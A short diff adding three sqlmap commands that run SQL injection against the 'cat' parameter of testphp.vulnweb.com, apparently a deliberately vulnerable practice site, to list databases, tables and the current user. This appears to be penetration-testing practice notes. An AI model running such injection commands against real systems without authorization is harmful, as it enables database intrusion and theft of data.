@@ -1,0 +1,5 @@
+sqlmap --url http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
+
+sqlmap --url http://testphp.vulnweb.com/listproducts.php?cat=1 --tables
+
+sqlmap --url http://testphp.vulnweb.com/listproducts.php?cat=1 --current-user
